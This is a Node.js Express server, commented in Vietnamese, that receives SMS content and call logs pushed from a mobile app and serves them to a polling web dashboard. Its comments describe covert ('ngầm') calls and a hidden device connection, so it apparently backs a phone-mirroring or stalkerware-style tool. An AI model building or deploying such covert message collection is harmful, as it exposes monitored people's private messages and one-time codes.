const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Đường dẫn lưu trữ file cơ sở dữ liệu JSON tổng
const DB_FILE = path.join(__dirname, 'all_logs.json');

// --- HÀM TIỆN ÍCH ĐỌC/GHI ĐĨA CỨNG ---
function readDatabase() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({}));
            return {};
        }
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return data.trim() ? JSON.parse(data) : {};
    } catch (error) {
        console.error("Lỗi đọc file database:", error);
        return {};
    }
}

function writeDatabase(data) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 4), 'utf8');
    } catch (error) {
        console.error("Lỗi ghi file database:", error);
    }
}

// Trả file giao diện quản trị điều khiển về khi truy cập trang chủ
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'app.html'));
});

/**
 * 1. API NHẬN REQUEST ĐẨY LÊN TỪ APP MOBILE (POST)
 * Nơi App di động gửi INIT, CALL ngầm, hoặc tin nhắn SMS sang
 */
app.post('/api/push', (req, res) => {
    const { myPhoneNumber, token, type, incomingNumber, content, time } = req.body;

    // Kiểm tra thông tin cốt lõi bắt buộc
    if (!myPhoneNumber || !token || !type) {
        return res.status(400).json({ error: "Thiếu thông tin định danh (SĐT hoặc Token)!" });
    }

    const db = readDatabase();
    const isNewAccount = !db[myPhoneNumber];

    // KIỂM TRA & KHỞI TẠO HỒ SƠ TỪ MOBILE
    if (isNewAccount) {
        db[myPhoneNumber] = {
            token: token,
            calls: [],
            sms: []
        };
        console.log(`[App Push - Khởi tạo] Tạo hồ sơ gốc tự động cho số: ${myPhoneNumber}`);
    } else {
        // Nếu tài khoản đã có sẵn nhưng app đổi mã Token mới (Ví dụ: người dùng bấm Sinh mã mới)
        if (db[myPhoneNumber].token !== token) {
            console.log(`[App Push - Cập nhật] Số ${myPhoneNumber} cập nhật mã Token mới từ thiết bị: ${token}`);
            db[myPhoneNumber].token = token;
        }
    }

    // XỬ LÝ RIÊNG CHO LỆNH KHỞI TẠO TỰ ĐỘNG (INIT) CỦA APP
    if (type.toUpperCase() === 'INIT') {
        const logId = "INIT_" + Date.now();
        db[myPhoneNumber].sms.push({
            id: logId,
            incomingNumber: incomingNumber || "HỆ THỐNG",
            content: content || "Thiết bị kết nối ngầm thành công.",
            time: time || new Date().toLocaleTimeString()
        });
        
        writeDatabase(db);
        return res.status(200).json({ status: "Success", message: "Đã kích hoạt tài khoản trực tuyến từ xa thành công." });
    }

    // XỬ LÝ CHO CÁC LOG CUỘC GỌI / SMS THỰC TẾ ĐẨY LÊN SAU NÀY
    if (!incomingNumber) {
        return res.status(400).json({ error: "Thiếu số điện thoại đối tác gửi đến!" });
    }

    const logId = type.toUpperCase() + "_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
    const newLogItem = {
        id: logId,
        incomingNumber: incomingNumber,
        content: content || "",
        time: time || new Date().toLocaleTimeString()
    };

    if (type.toUpperCase() === 'CALL') {
        db[myPhoneNumber].calls.push(newLogItem);
    } else if (type.toUpperCase() === 'SMS') {
        db[myPhoneNumber].sms.push(newLogItem);
    }

    writeDatabase(db);
    return res.status(200).json({ status: "Success", message: "Đã đồng bộ dữ liệu thành công." });
});

/**
 * 2. API TRẢ DỮ LIỆU VỀ CHO GIAO DIỆN WEB POLLING (GET)
 * Đã tối ưu cơ chế tự động đối chiếu: Chưa có đối tượng thì tự tạo, khác Token tự cập nhật đè.
 */
app.get('/api/fetch', (req, res) => {
    const { phone, token, lastId } = req.query; // Thêm tham số lastId từ Client

    let db = readDatabase();
    if (!db[phone] || db[phone].token !== token) {
        return res.status(403).json({ error: "Sai thông tin hoặc chưa kích hoạt!" });
    }

    const accountData = db[phone];
    const allLogs = [...(accountData.calls || []), ...(accountData.sms || [])];
    
    // Logic: Nếu Client gửi lastId lên, những log nào có id mới hơn sẽ được đánh dấu
    const responseData = {
        phone: phone,
        calls: accountData.calls.map(item => ({
            ...item,
            isNew: lastId ? (item.id > lastId) : false 
        })),
        sms: accountData.sms.map(item => ({
            ...item,
            isNew: lastId ? (item.id > lastId) : false
        }))
    };

    return res.status(200).json(responseData);
});

// Cấu hình cổng chạy tương thích tuyệt đối với Cloud Render / VPS
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`=== SERVER GƯƠNG CHIẾU INFORMINI ĐANG CHẠY TẠI PORT: ${PORT} ===`);
});